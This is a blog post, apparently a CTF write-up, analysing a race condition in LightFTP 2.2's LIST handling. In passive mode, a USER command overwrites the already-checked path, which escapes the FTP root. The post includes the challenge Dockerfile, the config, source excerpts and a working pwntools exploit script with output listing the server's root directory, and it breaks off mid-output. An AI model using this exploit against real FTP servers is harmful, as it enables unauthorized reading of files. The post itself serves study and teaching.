@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="NonHeavyFTP 12345678fftp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;dd778d889ef0dab05153ea682e9ad1ad3d493130, f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="条件竞争+FTP协议简析">
+<meta property="og:url" content="http://example.com/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="NonHeavyFTP 12345678fftp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;dd778d889ef0dab05153ea682e9ad1ad3d493130, f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/1673071731371.png">
+<meta property="article:published_time" content="2023-01-12T05:37:15.000Z">
+<meta property="article:modified_time" content="2023-01-12T05:38:23.979Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="Race condition">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/1673071731371.png">
+
+<link rel="canonical" href="http://example.com/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>条件竞争+FTP协议简析 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          条件竞争+FTP协议简析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-01-12 13:37:15 / Modified: 13:38:23" itemprop="dateCreated datePublished" datetime="2023-01-12T13:37:15+08:00">2023-01-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>NonHeavyFTP</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fftp: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=dd778d889ef0dab05153ea682e9ad1ad3d493130, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped    </span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/NonHeavyFTP/fftp&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，全开</li>
+</ul>
+<p><strong>环境搭建</strong></p>
+<p>查看 Dockerfile：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:<span class="number">22.04</span></span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">RUN apt-get update &amp;&amp;\</span><br><span class="line">    apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid</span><br><span class="line"></span><br><span class="line">RUN mkdir -p /server/data/ &amp;&amp;\</span><br><span class="line">    echo <span class="string">&quot;hello from LightFTP&quot;</span> &gt;&gt; /server/data/hello.txt &amp;&amp;\</span><br><span class="line">    cd /server &amp;&amp;\</span><br><span class="line">    wget --no-check-certificate https:<span class="comment">//codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &amp;&amp;\</span></span><br><span class="line"><span class="comment">    unzip LightFTP-2.2.zip &amp;&amp;\</span></span><br><span class="line"><span class="comment">    cd LightFTP-2.2/Source/Release &amp;&amp;\</span></span><br><span class="line"><span class="comment">    make &amp;&amp;\</span></span><br><span class="line"><span class="comment">    cp -a ./fftp /server/ &amp;&amp;\</span></span><br><span class="line"><span class="comment">    cd /server &amp;&amp;\</span></span><br><span class="line"><span class="comment">    rm -rf LightFTP-2.2 LightFTP-2.2.zip</span></span><br><span class="line"></span><br><span class="line">COPY ./flag /flag</span><br><span class="line">COPY ./fftp.conf /server/fftp.conf</span><br><span class="line"></span><br><span class="line">RUN mv /flag /flag.`uuid` &amp;&amp;\</span><br><span class="line">    useradd -M -d /server/ -U ftp</span><br><span class="line"></span><br><span class="line">WORKDIR /server</span><br><span class="line"></span><br><span class="line">EXPOSE <span class="number">2121</span></span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;ftp&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;ftp&quot;</span>, <span class="string">&quot;/server/fftp&quot;</span>, <span class="string">&quot;/server/fftp.conf&quot;</span>]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改了 flag 文件的名称</li>
+<li>源码下载地址为：<a target="_blank" rel="noopener" href="https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2">https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2</a></li>
+</ul>
+<p>搭建 docker 环境：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;fftp&quot;</span> .</span><br></pre></td></tr></table></figure>
+<p>启动 docker：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p <span class="number">2121</span>:<span class="number">2121</span> fftp:latest /bin/sh</span><br></pre></td></tr></table></figure>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ftpconfig]</span><br><span class="line">port=<span class="number">2121</span> <span class="comment">/* 要将服务器绑定到的端口号 */</span></span><br><span class="line">maxusers=<span class="number">10000000</span> <span class="comment">/* 与服务器的最大连接数,可同时建立 */</span></span><br><span class="line">interface=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="comment">/* 要绑定到的接口IP,使用0.0.0.0侦听任何可用接口,默认值:127.0.0.1 */</span></span><br><span class="line">local_mask=<span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span> <span class="comment">/* 本地网络的IP掩码,这将有助于服务器区分本地客户端和互联网客户端,默认值:255.255.255.0 */</span></span><br><span class="line"></span><br><span class="line">minport=<span class="number">30000</span> <span class="comment">/* 数据连接的端口范围,您可以使用它在网关设备上配置端口转发 */</span></span><br><span class="line">maxport=<span class="number">60000</span></span><br><span class="line"></span><br><span class="line">goodbyemsg=Goodbye!</span><br><span class="line">keepalive=<span class="number">1</span> <span class="comment">/* 发送激活数据包(某些NAT可能需要这样做) */</span></span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">pswd=* <span class="comment">/* 表示“任何密码都匹配” */</span></span><br><span class="line">accs=readonly <span class="comment">/* 不允许登录 */</span></span><br><span class="line">root=/server/data/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>开启了匿名登录</li>
+</ul>
+<p>在 <code>ftpLIST</code> 函数中还有一个条件竞争漏洞，之后再谈</p>
+<p><strong>入侵思路</strong></p>
+<p>利用匿名登录漏洞可以直接连接服务器：</p>
+<p><img src="/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/1673071731371.png" alt="1673071731371"> </p>
+<ul>
+<li><code>root=/server/data</code>：把 ftp 服务端的目录设置为 <code>/server/data</code></li>
+</ul>
+<p>通过 Dockerfile 可以发现 flag 在根目录中，接下来的目标就是利用 ftp 服务器的功能来获取根目录中的 flag</p>
+<ul>
+<li>这篇博客中讲解了如何实现 ftp 客户端：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jenie/article/details/106825292">c语言实现ftp客户端</a></li>
+<li>当然也可以使用 Linux 中的 ftp 命令来连接</li>
+<li>直接使用 <code>pwntools</code> 的 <code>remote</code> 模块也行</li>
+</ul>
+<p>分析 Dockerfile 可以发现：</p>
+<ul>
+<li>flag 文件在根目录中，而我们只能控制 <code>/server/data</code> 目录</li>
+<li>接下来的目标就是跳出程序的限制，从而读取出 flag</li>
+</ul>
+<p>本程序最关键的一个漏洞如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpLIST</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 验证目标目录路径 */</span></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; LIST&quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 创建list_thread线程来执行LIST命令 */</span></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))list_thread, context);</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>先调用 <code>ftp_effective_path</code> 检查文件路径</li>
+<li>再创建 <code>list_thread</code> 来执行 LIST 命令</li>
+</ul>
+<p>关于“被动模式”：</p>
+<ul>
+<li>当 FTP 处于“被动模式”时，数据将使用新套接字 socket 传输</li>
+<li>在 <code>create_datasocket</code> 函数中（<code>list_thread</code> 中会调用这个函数），线程会卡在 <code>accept</code> 函数中，等待客户端连接</li>
+<li>当客户端进行连接时，它将读取 <code>context-&gt;FileName</code> 的文件目录</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">list_thread</span><span class="params">(PFTPCONTEXT context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> SOCKET     clientsocket;</span><br><span class="line">    <span class="keyword">gnutls_session_t</span>	TLS_datasession;</span><br><span class="line">    <span class="keyword">int</span>					ret;</span><br><span class="line">    DIR					*pdir;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>		*<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line">    pthread_cleanup_push(cleanup_handler, context);</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    TLS_datasession = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    clientsocket = create_datasocket(context);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>PFTPCONTEXT</code> 是一个指针</li>
+</ul>
+<p>在“被动模式”下，程序先检查文件路径，然后卡在 <code>create_datasocket</code> 函数中</p>
+<p>如果此时修改 <code>create_datasocket</code> 函数的参数 <code>context</code>，就可以跳出 <code>/server/data</code> 的限制（已经检查过文件路径了）</p>
+<p>具体可以使用 <code>ftpUSER</code> 函数来修改 <code>context</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpUSER</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;</span><br><span class="line"></span><br><span class="line">    writelogentry(context, <span class="string">&quot; USER: &quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">    <span class="built_in">snprintf</span>(context-&gt;FileName, <span class="keyword">sizeof</span>(context-&gt;FileName), <span class="string">&quot;331 User %s OK. Password required\r\n&quot;</span>, params);</span><br><span class="line">    sendstring(context, context-&gt;FileName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Save login name to FileName for the next PASS command */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(context-&gt;FileName, params);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>PFTPCONTEXT</code> 是一个指针，<code>ftpUSER</code> 和 <code>ftpLIST</code> 共享同一片空间的数据</li>
+</ul>
+<p>测试脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">p = remote(ip,<span class="number">2121</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;USER anonymous\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line">p.send(<span class="string">&quot;PASS 123456\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;EPSV\r\n&quot;</span>)</span><br><span class="line">ret = p.recv()</span><br><span class="line">success(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Entering Extended Passive Mode&quot;</span> <span class="keyword">in</span> ret:</span><br><span class="line">    parts = ret.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    pport = <span class="built_in">int</span>(parts[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;Passive port: %s&quot;</span> % pport)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;LIST \r\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;USER / \r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p2 = remote(ip,pport)</span><br><span class="line"></span><br><span class="line">success(p.recv())</span><br><span class="line">success(<span class="string">&quot;&lt;------------------------------------&gt;&quot;</span>)</span><br><span class="line">success(p2.recv())</span><br></pre></td></tr></table></figure>
+<ul>
+<li>结果：（这里直接使用主机来进行测试了）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">➜  NonHeavyFTP python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Opening connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> on port <span class="number">2121</span>: Done</span><br><span class="line">[+] <span class="number">220</span> LightFTP server ready</span><br><span class="line">    <span class="number">331</span> User anonymous OK. Password required</span><br><span class="line">[+] <span class="number">230</span> User logged in, proceed.</span><br><span class="line">[+] <span class="number">229</span> <span class="function">Entering Extended Passive <span class="title">Mode</span> <span class="params">(|||<span class="number">33416</span>|)</span></span></span><br><span class="line"><span class="function">[+] Passive port: 33416</span></span><br><span class="line"><span class="function">[+] Opening connection to 127.0.0.1 on port 33416: Done</span></span><br><span class="line"><span class="function">[+] 150 File status okay</span>; about to open data connection.</span><br><span class="line">    <span class="number">331</span> User / OK. Password required</span><br><span class="line">[+] &lt;------------------------------------&gt;</span><br><span class="line">[+] drwxrwxrwt  <span class="number">25</span> <span class="number">0</span> <span class="number">0</span> <span class="number">12288</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">25</span> tmp</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lib</span><br><span class="line">    drwxr-xr-x  <span class="number">142</span> <span class="number">0</span> <span class="number">0</span> <span class="number">12288</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">05</span> etc</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> libx32</span><br><span class="line">    drwxr-xr-x  <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">09</span> <span class="number">19</span>:<span class="number">48</span> srv</span><br><span class="line">    -rwxr-xr-x  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">14</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">20</span> flag</span><br><span class="line">    drwxrwxr-x  <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">12</span> cdrom</span><br><span class="line">    dr-xr-xr-x  <span class="number">400</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">00</span> proc</span><br><span class="line">    drwxr-xr-x  <span class="number">14</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Sep <span class="number">06</span> <span class="number">16</span>:<span class="number">40</span> usr</span><br><span class="line">    dr-xr-xr-x  <span class="number">13</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">00</span> sys</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lib64</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Oct <span class="number">01</span> <span class="number">11</span>:<span class="number">00</span> opt</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">26</span> home</span><br><span class="line">    drwxr-xr-x  <span class="number">38</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1040</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">21</span> run</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Jan <span class="number">12</span> <span class="number">13</span>:<span 